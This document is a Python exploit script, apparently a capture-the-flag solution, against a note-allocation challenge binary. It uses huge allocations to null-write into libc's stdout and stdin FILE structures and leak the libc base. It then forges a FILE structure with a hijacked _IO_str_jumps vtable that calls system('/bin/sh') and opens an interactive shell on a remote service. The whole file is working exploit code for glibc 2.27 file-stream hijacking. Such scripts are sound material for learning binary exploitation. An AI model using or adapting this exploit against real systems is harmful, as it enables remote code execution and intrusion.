#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdout          = libc.symbols['_IO_2_1_stdout_']
offset_libc_stdin           = libc.symbols['_IO_2_1_stdin_']
offset_libc_io_file_jumps   = libc.symbols['_IO_file_jumps']
offset_libc_malloc_hook     = libc.symbols['__malloc_hook']

#==========

def attack(conn, **kwargs):
    ln = LazyNote(conn)

    ln.writenull(offset_libc_stdout + 0x10) # _IO_read_end
    ln.silent = True
    ln.writenull(offset_libc_stdout + 0x20) # _IO_write_base
    ln.silent = False

    conn.recv(0x58)
    addr_libc_io_file_jumps = u64(conn.recv(8))
    libc.address = addr_libc_io_file_jumps - offset_libc_io_file_jumps
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_stdin         = libc.symbols['_IO_2_1_stdin_']
    addr_libc_io_file_jumps = libc.symbols['_IO_file_jumps']
    addr_libc_io_str_jumps  = addr_libc_io_file_jumps + 0xc0
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    ln.writenull(offset_libc_stdin + 0x38)  # _IO_buf_base

    stdin_2  = p64(0xfbad2080)
    stdin_2 += p64(addr_libc_stdin)
    stdin_2 += p64(0)*3
    stdin_2 += p64((addr_libc_str_sh - 0x64) // 2)  # _IO_write_ptr
    stdin_2 += p64(0)*2
    stdin_2 += p64((addr_libc_str_sh - 0x64) // 2)  # _IO_buf_end
    stdin_2 += p64(0)*18
    stdin_2 += p64(addr_libc_io_str_jumps - 0x10)
    stdin_2 += p64(addr_libc_system)

    stdin_1  = p64(0xfbad208b)
    stdin_1 += p64(addr_libc_stdin)
    stdin_1 += p64(0)*5
    stdin_1 += p64(addr_libc_stdin)                 # _IO_buf_base
    stdin_1 += p64(addr_libc_stdin + len(stdin_2))  # _IO_buf_end

    conn.sendlineafter("> ", stdin_1.ljust(0x84, b'\x00') + stdin_2)

class LazyNote:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        self.offset         = 0
        self.silent         = False

    def alloc(self, size, length, data):
        if self.silent:
            self.send('1\n{}\n{}\n{}\n'.format(size, length, data))
        else:
            self.sendlineafter('> ', '1')
            self.sendlineafter('alloc size: ', str(size))
            self.sendlineafter('read size: ', str(length))
            self.sendlineafter('data: ', data)

    def writenull(self, ofs, data = ''):
        self.offset += 0x1e4000
        self.alloc(0x1e3fe8, self.offset + ofs - 0xf, data)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
